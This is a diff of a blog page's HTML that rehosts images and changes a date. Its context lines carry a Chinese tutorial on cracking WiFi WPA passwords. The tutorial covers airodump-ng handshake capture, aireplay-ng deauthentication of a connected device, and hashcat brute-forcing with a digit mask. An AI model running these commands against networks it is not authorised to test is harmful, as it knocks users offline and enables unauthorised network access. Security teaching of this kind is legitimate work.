@@ -271,7 +271,7 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210831113326.png')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/20210831113326.png')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
@@ -432,7 +432,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2021-08-31
+                    2021-11-22
                 </div>
                 
 
@@ -681,7 +681,7 @@ airmon-ng start wlan0<span aria-hidden="true" class="line-numbers-rows"><span></
 <p>2、扫描可用 WIFI</p>
 <pre class="line-numbers language-none"><code class="language-none">airodump-ng wlan0mon<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210831104636.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
+<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/20210831104636.png"></p>
 <p>3、获取wifi的握手包</p>
 <pre class="line-numbers language-none"><code class="language-none">airodump-ng -c (上一步扫描的 CH ) --bssid (想要破解 WIFI 的 bssid ) -w (握手文件存放目录) wlan0mon<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
@@ -691,12 +691,12 @@ airmon-ng start wlan0<span aria-hidden="true" class="line-numbers-rows"><span></
 <p>为了顺利得到 WIFI 的握手包，可以将该 WIFI 下的设备强制踢下去</p>
 <pre class="line-numbers language-none"><code class="language-none">aireplay-ng -0 0 -a (要破解的 wifi 的 bssid ) -c (强制踢下的设备的 MAC 地址) wlan0mon<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210831105351.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
+<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/20210831105351.png"></p>
 <p>可以看到 teamssix 这个 WIFI 有一个设备正在连接，该设备的 MAC 地址为：38:26:2C:13:D3:33，使用以下命令可以将其强制踢下去</p>
 <pre class="line-numbers language-none"><code class="language-none">aireplay-ng -0 0 -a 5E:C1:1B:A2:37:F1 -c 38:26:2C:13:D3:33 wlan0mon<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>等待设备重新连接后，当右上角出现 WPA handshake 的时候说明获取成功</p>
-<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210831132010.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
+<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/20210831132010.png"></p>
 <p>4、破解密码</p>
 <p>使用 aircrack-ng 将握手包转换成 hccapx 格式</p>
 <pre class="line-numbers language-none"><code class="language-none">aircrack-ng 1.cap -j 1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
@@ -706,7 +706,7 @@ airmon-ng start wlan0<span aria-hidden="true" class="line-numbers-rows"><span></
 <p>或者使用 hashcat 官网提供的在线工具进行格式转换：<a target="_blank" rel="noopener" href="https://hashcat.net/cap2hashcat/">https://hashcat.net/cap2hashcat/</a></p>
 <pre class="line-numbers language-none"><code class="language-none">hashcat -a 3 -m 22000 1.hc22000 ?d?d?d?d?d?d?d?d --force<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210831113326.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
+<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/20210831113326.png"></p>
 <h2 id="5、其他"><a href="#5、其他" class="headerlink" title="5、其他"></a>5、其他</h2><ul>
 <li><p>Hashcat 在有时破解的时候会提示 All hashes found in potfile!，这表明该 hash 已经被破解出来过了，可以使用 hashcat [哈希值] –show 查看已破解出来的明文密码。</p>
 </li>
@@ -732,7 +732,7 @@ airmon-ng start wlan0<span aria-hidden="true" class="line-numbers-rows"><span></
 <p><a target="_blank" rel="noopener" href="https://mysock.net/2021/01/03/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E7%94%A8%20rar2john+hashcat%20%E7%A0%B4%E8%A7%A3%20RAR%20%E6%96%87%E4%BB%B6%E5%AF%86%E7%A0%81/">https://mysock.net/2021/01/03/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E7%94%A8%20rar2john+hashcat%20%E7%A0%B4%E8%A7%A3%20RAR%20%E6%96%87%E4%BB%B6%E5%AF%86%E7%A0%81/</a></p>
 <p>更多信息欢迎关注我的微信公众号：TeamsSix</p>
 </blockquote>
-<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>
+<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/TeamsSix_Subscription_Logo2.png"></p>
 
                 
             </div>
@@ -884,7 +884,7 @@ airmon-ng start wlan0<span aria-hidden="true" class="line-numbers-rows"><span></
                 <a href="/210901-160349.html">
                     <div class="card-image">
                         
-                        <img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210901154851.png" class="responsive-img" alt="【内网学习笔记】21、哈希传递与票据传递">
+                        <img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/20210901154851.png" class="responsive-img" alt="【内网学习笔记】21、哈希传递与票据传递">
                         
                         <span class="card-title">【内网学习笔记】21、哈希传递与票据传递</span>
                     </div>
@@ -940,7 +940,7 @@ airmon-ng start wlan0<span aria-hidden="true" class="line-numbers-rows"><span></
                 <a href="/210813-153545.html">
                     <div class="card-image">
                         
-                        <img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210813150936.png" class="responsive-img" alt="反制 Goby RCE 复现及 Mac 用户防御策略">
+                        <img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/20210813150936.png" class="responsive-img" alt="反制 Goby RCE 复现及 Mac 用户防御策略">
                         
                         <span class="card-title">反制 Goby RCE 复现及 Mac 用户防御策略</span>
                     </div>
